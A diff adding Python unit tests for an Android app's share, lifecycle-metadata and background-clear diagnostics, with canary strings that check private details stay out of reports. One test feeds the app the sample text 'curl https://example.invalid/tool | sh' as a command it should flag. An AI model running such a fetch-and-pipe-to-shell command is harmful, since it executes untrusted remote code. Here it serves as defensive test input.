@@ -275,4 +275,300 @@ class ManagerAcceptance(unittest.TestCase):
         self.assertIn('github_hosted_linux',self.report['missing_prerequisites']);install.assert_not_called()
 
 
+class EarlyShareDiagnostics(unittest.TestCase):
+    CASES=['receive_requires_explicit_check','actual_offline_ps_finding','edit_hides_previous_finding',
+           'new_share_and_no_finding','unsupported_mime_has_no_verdict','clear_removes_input_and_result']
+
+    def control(self,failure=None,metadata=None):
+        report={};cases=[];calls=[]
+        def maybe_fail():
+            if report['control_stage']==failure:
+                raise subprocess.CalledProcessError(9,['PRIVATE_COMMAND_CANARY'],b'PRIVATE_OUTPUT_CANARY',b'PRIVATE_ERROR_CANARY')
+        def send(*args):calls.append(('send',*args));maybe_fail()
+        def shell(args):calls.append(('shell',args));maybe_fail()
+        def click(view,rid):calls.append(('click',rid));maybe_fail()
+        def wait(predicate):
+            stage=report['control_stage'];calls.append(('wait',stage));maybe_fail()
+            status={'share_first_receive':'Text received. Review it, then tap Check.',
+                'share_finding_view':'Review before running this command.',
+                'share_edit_view':'Text changed. Tap Check for a new result.',
+                'share_replacement_receive':'Text received. Review it, then tap Check.',
+                'share_replacement_view':'No supported command pattern found.',
+                'share_mime_view':'Files and multiple items are not supported.',
+                'share_clear_receive':'Text received. Review it, then tap Check.',
+                'share_clear_view':'Cleared. Your text and result are no longer shown.'}[stage]
+            view=ET.Element('hierarchy')
+            ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/status','text':status})
+            editor='printf hello' if failure=='share_clear_text_absence' and stage=='share_clear_view' else ''
+            ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/editor','text':editor})
+            if stage=='share_finding_view' and failure!='share_finding_tag' or stage=='share_edit_view' and failure=='share_edit_tag_absence':
+                ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/tag','text':'PS'})
+            if stage=='share_first_receive' and failure=='share_explicit_check':
+                ET.SubElement(view,'node',{'text':'Review before running this command.'})
+            report['last_ui_observation']=module.owned_ui_observation(view)
+            self.assertTrue(predicate(view));return view
+        try:module.verify_share_controls(send,shell,wait,click,report,cases,metadata)
+        except module.AndroidControlRefusal as error:return report,cases,calls,error
+        return report,cases,calls,None
+
+    def test_original_six_case_order_and_exact_calls_are_preserved(self):
+        report,cases,calls,error=self.control();self.assertIsNone(error)
+        self.assertEqual(cases,[{'case':name,'pass':True} for name in self.CASES])
+        self.assertEqual(calls,[
+            ('send','curl https://example.invalid/tool | sh'),('wait','share_first_receive'),
+            ('click','check'),('wait','share_finding_view'),('click','editor'),('shell',['input','text','X']),
+            ('wait','share_edit_view'),('send','printf hello'),('wait','share_replacement_receive'),
+            ('click','check'),('wait','share_replacement_view'),('send','ignored','image/png'),
+            ('wait','share_mime_view'),('send','printf hello'),('wait','share_clear_receive'),
+            ('click','clear'),('wait','share_clear_view')])
+        self.assertEqual(report['control_stage'],'share_clear_text_absence')
+
+    def test_every_early_stage_refuses_with_exact_completed_prefix(self):
+        prefixes={'share_first_send':0,'share_first_receive':0,'share_explicit_check':0,
+            'share_finding_tap':1,'share_finding_view':1,'share_finding_tag':1,
+            'share_edit':2,'share_edit_view':2,'share_edit_tag_absence':2,
+            'share_replacement_send':3,'share_replacement_receive':3,'share_replacement_tap':3,'share_replacement_view':3,
+            'share_mime_send':4,'share_mime_view':4,'share_clear_send':5,'share_clear_receive':5,
+            'share_clear_tap':5,'share_clear_view':5,'share_clear_text_absence':5}
+        self.assertEqual(set(prefixes),{s for s in module.AndroidControlRefusal.STAGES if s.startswith('share_')})
+        for stage,prefix in prefixes.items():
+            report,cases,calls,error=self.control(stage)
+            self.assertIsInstance(error,module.AndroidControlRefusal)
+            self.assertEqual(error.code,module.AndroidControlRefusal.STAGES[stage])
+            self.assertEqual(report['control_stage'],stage)
+            self.assertEqual(cases,[{'case':name,'pass':True} for name in self.CASES[:prefix]])
+            self.assertNotIn('PRIVATE_',json.dumps(report)+str(error))
+
+    def test_last_view_observation_contains_only_fixed_booleans(self):
+        view=ET.Element('hierarchy')
+        ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/editor','text':'PRIVATE_SUBJECT_CANARY /private/example?token=PRIVATE_TOKEN'})
+        ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/status','text':'Ready when you are.'})
+        ET.SubElement(view,'node',{'package':'com.android.launcher3','text':'PRIVATE_OTHER_APP_CANARY'})
+        ET.SubElement(view,'node',{'package':'com.android.systemui','text':'PRIVATE_LOCKSCREEN_CANARY'})
+        ET.SubElement(view,'node',{'resource-id':'android:id/aerr_close','text':'PRIVATE_ERROR_CANARY'})
+        result=module.owned_ui_observation(view)
+        self.assertTrue(all(type(v) is bool for v in result.values()))
+        self.assertTrue(result['owned_ui_present'] and result['owned_editor_present'] and result['owned_editor_nonempty'])
+        self.assertTrue(result['ready_text_present'] and result['launcher_ui_present'] and result['system_ui_present'] and result['platform_error_dialog_present'])
+        self.assertFalse(result['received_text_present'] or result['first_synthetic_text_present'] or result['tag_ps_present'])
+        self.assertNotIn('PRIVATE_',json.dumps(result));self.assertNotIn('/private',json.dumps(result))
+
+    def test_empty_or_other_app_view_is_observed_not_a_fake_app_success(self):
+        view=ET.fromstring('<hierarchy><node package="other.example" text="PRIVATE_OTHER_APP_CANARY"/></hierarchy>')
+        self.assertTrue(all(v is False for v in module.owned_ui_observation(view).values()))
+
+    def test_start_output_has_only_fixed_hints_not_private_details_or_success(self):
+        raw=('Status: timeout\nActivity: '+module.COMPONENT+'\nWarning: PRIVATE_WARNING /private/file\nError: PRIVATE_TOKEN https://example.invalid/private\n').encode()
+        result=module.share_start_observation(raw)
+        self.assertEqual(result,{'status_ok_reported':False,'status_timeout_reported':True,
+            'error_reported':True,'warning_reported':True,'owned_component_reported':True})
+        self.assertTrue(all(type(v) is bool for v in result.values()))
+        self.assertNotIn('PRIVATE_',json.dumps(result));self.assertNotIn('/private',json.dumps(result))
+        self.assertTrue(module.share_start_observation(b'Status: ok\r\n')['status_ok_reported'])
+        self.assertTrue(all(v is False for v in module.share_start_observation(b'\xffPRIVATE_UNKNOWN_NATIVE_OUTPUT').values()))
+
+    def test_real_main_distinguishes_first_send_and_existing_dump_read_parse_failures(self):
+        for operation in ['send','dump','read','parse']:
+            with tempfile.TemporaryDirectory() as temporary:
+                home=Path(temporary);fake_process=mock.Mock();fake_process.poll.return_value=None;fake_process.wait.return_value=0
+                def run(argv,**kwargs):
+                    result=subprocess.CompletedProcess(argv,0,b'',b'')
+                    if 'shell' not in argv:return result
+                    command=argv[-1]
+                    if command=='getprop sys.boot_completed':result.stdout=b'1'
+                    elif command.startswith('am start'):
+                        if operation=='send':result.returncode=1
+                        else:result.stdout=b'Status: timeout\nPRIVATE_NATIVE_CANARY\n'
+                    elif command.startswith('uiautomator dump') and operation=='dump':result.returncode=1
+                    elif command.startswith('cat '):
+                        if operation=='read':result.returncode=1
+                        else:result.stdout=b'<PRIVATE_XML_CANARY'
+                    return result
+                def prepare(sdk,report):
+                    report['share_start_observation']={'status_ok_reported':True}
+                    return home/'adb',home/'emulator',home/'avdmanager'
+                with mock.patch.object(module,'ROOT',home),mock.patch.object(sys,'argv',['verify','--sdk-root',temporary,'--apk','PRIVATE_APK_CANARY']),mock.patch.dict(os.environ,{'RUNNER_TEMP':temporary}),mock.patch.object(module,'prepare_emulator',side_effect=prepare),mock.patch.object(module.subprocess,'Popen',return_value=fake_process),mock.patch.object(module.subprocess,'run',side_effect=run),mock.patch('sys.stdout',new_callable=io.StringIO) as out:
+                    self.assertEqual(module.main(),1)
+                report=json.loads(out.getvalue())
+                self.assertEqual(report['diagnostic_code'],'share_first_send_unavailable' if operation=='send' else 'share_first_receive_unavailable')
+                self.assertEqual(report['cases'],[]);self.assertEqual(report['status'],'FAILED');self.assertFalse(report['pass'])
+                if operation=='send':
+                    self.assertNotIn('ui_operation',report)
+                    self.assertNotIn('share_start_observation',report)
+                else:
+                    self.assertEqual(report['ui_operation'],operation)
+                    self.assertTrue(report['share_start_observation']['status_timeout_reported'])
+                self.assertNotIn('last_ui_observation',report)
+                self.assertNotIn('PRIVATE_',out.getvalue());self.assertNotIn(temporary,out.getvalue())
+                fake_process.terminate.assert_called_once()
+
+
+class LifecycleMetadataDiagnostics(unittest.TestCase):
+    def line(self,tag,values):return ('I/'+tag+'( 123): ['+','.join(values)+']\n').encode()
+
+    def test_exact_owned_schema_positions_and_finite_action_sequence(self):
+        raw=b'--------- beginning of events\n'
+        raw+=self.line('wm_create_activity',['0','55','7',module.COMPONENT,'android.intent.action.SEND','text/plain','PRIVATE_URI_CANARY','0'])
+        raw+=self.line('wm_new_intent',['0','55','7',module.PACKAGE+'/'+module.PACKAGE+'.CheckActivity','android.intent.action.MAIN','','PRIVATE_URI_CANARY','0'])
+        raw+=self.line('wm_relaunch_activity',['0','55','7',module.COMPONENT,'PRIVATE_CONFIG_CANARY'])
+        for tag in ['wm_on_create_called','wm_on_resume_called','wm_on_paused_called','wm_on_stop_called']:
+            raw+=self.line(tag,['55',module.PACKAGE+'.CheckActivity','PRIVATE_REASON_CANARY','999'])
+        result=module.lifecycle_event_observation(raw)
+        self.assertEqual(result['state'],'OBSERVED')
+        self.assertTrue(all(v==1 for v in result['observed_event_counts'].values()))
+        self.assertEqual(result['observed_start_actions']['wm_create_activity'],{'SEND':1,'MAIN':0,'OTHER':0})
+        self.assertEqual(result['observed_start_actions']['wm_new_intent'],{'SEND':0,'MAIN':1,'OTHER':0})
+        self.assertEqual(result['observed_sequence'],['wm_create_activity:SEND','wm_new_intent:MAIN','wm_relaunch_activity',
+            'wm_on_create_called','wm_on_resume_called','wm_on_paused_called','wm_on_stop_called'])
+        self.assertFalse(result['absence_proves_no_callback'])
+        serialized=json.dumps(result);self.assertNotIn('PRIVATE_',serialized);self.assertNotIn('999',serialized)
+        self.assertNotIn(module.PACKAGE,serialized)
+
+    def test_component_filter_rejects_sibling_prefix_and_wrong_field_binding(self):
+        raw=self.line('wm_create_activity',['0','55','7',module.PACKAGE+'.other/.CheckActivity','android.intent.action.SEND','',module.COMPONENT,'0'])
+        raw+=self.line('wm_on_create_called',['55','other.example.Activity',module.PACKAGE+'.CheckActivity','999'])
+        result=module.lifecycle_event_observation(raw)
+        self.assertEqual(result['state'],'NO_MATCHING_OWNED_EVENTS')
+        self.assertTrue(all(v==0 for v in result['observed_event_counts'].values()))
+        self.assertFalse(result['absence_proves_no_callback'])
+
+    def test_unknown_action_is_other_not_a_raw_string(self):
+        raw=self.line('wm_new_intent',['0','55','7',module.COMPONENT,'PRIVATE_ACTION_CANARY','','','0'])
+        result=module.lifecycle_event_observation(raw)
+        self.assertEqual(result['observed_start_actions']['wm_new_intent']['OTHER'],1)
+        self.assertNotIn('PRIVATE_ACTION_CANARY',json.dumps(result))
+
+    def test_malformed_records_are_partial_and_bounds_or_bad_encoding_unavailable(self):
+        for raw in [b'I/wm_create_activity(1): [bad]\n',b'PRIVATE_UNKNOWN_FRAMING\n',
+                    self.line('wm_create_activity',['not-numeric','55','7',module.COMPONENT,'android.intent.action.SEND','','','0'])]:
+            result=module.lifecycle_event_observation(raw)
+            self.assertEqual(result['state'],'PARTIAL');self.assertEqual(result['unparsed_selected_records'],1)
+            self.assertNotIn('PRIVATE_',json.dumps(result))
+        for raw in [b'\xff',b'x'*(module.LIFECYCLE_METADATA_BYTES+1),b'\n'*(module.LIFECYCLE_EVENT_LIMIT+5),None]:
+            self.assertEqual(module.lifecycle_event_observation(raw),{'state':'UNAVAILABLE','reason':'lifecycle_metadata_unavailable'})
+
+    def test_query_is_one_read_only_events_command_with_five_second_deadline(self):
+        shell=mock.Mock(return_value=b'')
+        result=module.collect_first_failure_metadata(shell)
+        shell.assert_called_once_with(['logcat','-b','events','-d','-t','128','-v','brief']+
+            [tag+':I' for tag in module.LIFECYCLE_EVENT_PROFILES]+['*:S'],5)
+        self.assertEqual(result['state'],'NO_MATCHING_OWNED_EVENTS')
+        shell=mock.Mock(side_effect=OSError('PRIVATE_NATIVE_ERROR_CANARY'))
+        self.assertEqual(module.collect_first_failure_metadata(shell),{'state':'UNAVAILABLE','reason':'lifecycle_metadata_unavailable'})
+        shell.assert_called_once()
+
+    def test_diagnostics_only_on_first_failure_and_cannot_mask_primary_refusal(self):
+        runner=EarlyShareDiagnostics()
+        for failure in [None,'share_finding_view']:
+            collect=mock.Mock(side_effect=AssertionError('Diagnostics must not run'))
+            report,cases,calls,error=runner.control(failure,collect);collect.assert_not_called()
+        collect=mock.Mock(return_value={'state':'NO_MATCHING_OWNED_EVENTS'})
+        report,cases,calls,error=runner.control('share_first_receive',collect)
+        collect.assert_called_once_with();self.assertEqual(error.code,'share_first_receive_unavailable');self.assertEqual(cases,[])
+        self.assertEqual(report['first_failure_lifecycle'],{'state':'NO_MATCHING_OWNED_EVENTS'})
+        collect=mock.Mock(side_effect=RuntimeError('PRIVATE_DIAGNOSTIC_CANARY'))
+        report,cases,calls,error=runner.control('share_first_receive',collect)
+        self.assertEqual(error.code,'share_first_receive_unavailable');self.assertEqual(cases,[])
+        self.assertEqual(report['first_failure_lifecycle'],{'state':'UNAVAILABLE','reason':'lifecycle_metadata_unavailable'})
+        self.assertNotIn('PRIVATE_',json.dumps(report)+str(error))
+
+
+class BackgroundControlDiagnostics(unittest.TestCase):
+    def run_control(self,failure=None,final='cleared',tasks=None):
+        report={'cases':[{'case':'earlier_control','pass':True}]};calls=[];waits=[]
+        def view(status,marker=False):
+            root=ET.Element('hierarchy')
+            ET.SubElement(root,'node',{'resource-id':module.PACKAGE+':id/status','text':status})
+            ET.SubElement(root,'node',{'resource-id':module.PACKAGE+':id/editor','text':'synthetic private marker' if marker else ''})
+            return root
+        def send(value):
+            calls.append(('send',value))
+            if failure=='background_receive':raise OSError('PRIVATE_COMMAND_CANARY')
+        def shell(argv):
+            calls.append(('shell',argv))
+            stage=report['control_stage']
+            if failure==stage:raise subprocess.CalledProcessError(9,['PRIVATE_COMMAND_CANARY'],b'PRIVATE_OUTPUT_CANARY',b'PRIVATE_ERROR_CANARY')
+            if argv==['dumpsys','activity','activities']:
+                return tasks if tasks is not None else ('Task{abc #73 type=standard A=10001:'+module.PACKAGE+'}\n').encode()
+            return b''
+        def wait(predicate):
+            waits.append(predicate)
+            if len(waits)==1:
+                received=view('Text received. Review it, then tap Check.',True)
+                self.assertTrue(predicate(received));return received
+            if failure=='background_cleared_view':
+                self.assertFalse(predicate(view('Unrelated foreground text',True)))
+                raise ValueError('PRIVATE_TIMEOUT_CANARY')
+            seen=view('Ready when you are.' if final=='ready' else 'Cleared. Your text and result are no longer shown.',final=='marker')
+            self.assertTrue(predicate(seen));return seen
+        try:module.verify_background_clear(send,shell,wait,report)
+        except module.AndroidControlRefusal as error:return report,calls,waits,error
+        return report,calls,waits,None
+
+    def test_original_command_order_and_ready_or_cleared_success_are_preserved(self):
+        for final in ['ready','cleared']:
+            report,calls,waits,error=self.run_control(final=final)
+            self.assertIsNone(error);self.assertEqual(len(waits),2)
+            self.assertEqual(calls,[('send','synthetic private marker'),
+                ('shell',['input','keyevent','KEYCODE_HOME']),
+                ('shell',['dumpsys','activity','activities']),('shell',['am','task','focus','73'])])
+            self.assertEqual(report['background_owned_task_matches'],1)
+            self.assertEqual(report['cases'],[{'case':'earlier_control','pass':True}])
+            self.assertEqual(report['control_stage'],'background_marker_absence')
+            self.assertEqual(report['background_observation'],{'owned_ui_present':True,'ready_text_present':final=='ready',
+                'cleared_text_present':final=='cleared','synthetic_marker_present':False})
+
+    def test_every_command_failure_is_fixed_and_cannot_append_a_pass(self):
+        for stage in ['background_receive','background_home','background_task_inventory','background_refocus','background_cleared_view']:
+            report,calls,waits,error=self.run_control(failure=stage)
+            self.assertIsInstance(error,module.AndroidControlRefusal)
+            self.assertEqual(error.code,module.AndroidControlRefusal.STAGES[stage])
+            self.assertEqual(str(error),error.code);self.assertTrue(error.__suppress_context__)
+            self.assertEqual(report['control_stage'],stage)
+            self.assertEqual(report['cases'],[{'case':'earlier_control','pass':True}])
+            self.assertNotIn('PRIVATE_',json.dumps(report)+str(error))
+        self.assertEqual(report['background_observation'],{'owned_ui_present':True,'ready_text_present':False,
+            'cleared_text_present':False,'synthetic_marker_present':True})
+
+    def test_absent_owned_task_refuses_before_focus_without_dump_echo(self):
+        report,calls,waits,error=self.run_control(tasks=b'Task{abc #999 A=other.example PRIVATE_DUMP_CANARY}\n')
+        self.assertEqual(error.code,'background_owned_task_unavailable');self.assertEqual(report['background_owned_task_matches'],0)
+        self.assertFalse(any(call[0]=='shell' and call[1][:3]==['am','task','focus'] for call in calls))
+        self.assertNotIn('PRIVATE_DUMP_CANARY',json.dumps(report)+str(error))
+
+    def test_marker_retention_still_refuses_after_cleared_text(self):
+        report,calls,waits,error=self.run_control(final='marker')
+        self.assertEqual(error.code,'background_marker_retained')
+        self.assertTrue(report['background_observation']['synthetic_marker_present'])
+        self.assertTrue(report['background_observation']['cleared_text_present'])
+
+    def test_inventory_decode_failure_is_fixed_not_a_false_missing_task(self):
+        report,calls,waits,error=self.run_control(tasks=b'\xffPRIVATE_DUMP_CANARY')
+        self.assertEqual(error.code,'background_task_inventory_unavailable')
+        self.assertNotIn('background_owned_task_matches',report)
+
+    def test_original_first_match_behavior_is_not_changed_by_diagnostics(self):
+        tasks=('Task{a #73 A='+module.PACKAGE+'}\nTask{b #74 A='+module.PACKAGE+'}\n').encode()
+        report,calls,waits,error=self.run_control(tasks=tasks)
+        self.assertIsNone(error);self.assertEqual(report['background_owned_task_matches'],2)
+        self.assertEqual(calls[-1],('shell',['am','task','focus','73']))
+
+    def test_fixed_stage_codes_reach_main_without_private_details(self):
+        with tempfile.TemporaryDirectory() as temp:
+            for stage,code in module.AndroidControlRefusal.STAGES.items():
+                def refuse(sdk,report):
+                    report['phase']='share_controls';report['control_stage']=stage
+                    raise module.AndroidControlRefusal(stage)
+                with mock.patch.object(module,'ROOT',Path(temp)),mock.patch.object(sys,'argv',['verify','--sdk-root',temp,'--apk','PRIVATE_ARG_CANARY']),mock.patch.object(module,'prepare_emulator',side_effect=refuse),mock.patch('sys.stdout',new_callable=io.StringIO) as out:
+                    self.assertEqual(module.main(),1)
+                report=json.loads(out.getvalue());self.assertEqual(report['diagnostic_code'],code)
+                self.assertEqual(report['phase'],'share_controls');self.assertEqual(report['control_stage'],stage)
+                self.assertFalse(report['pass']);self.assertEqual(report['status'],'FAILED');self.assertEqual(report['cases'],[])
+                self.assertNotIn('PRIVATE_',out.getvalue());self.assertNotIn(temp,out.getvalue())
+
+    def test_unknown_stage_cannot_be_published(self):
+        with self.assertRaisesRegex(ValueError,'^Invalid Android control diagnostic$'):
+            module.AndroidControlRefusal('PRIVATE_STAGE_CANARY')
+
+
 if __name__=='__main__':unittest.main()
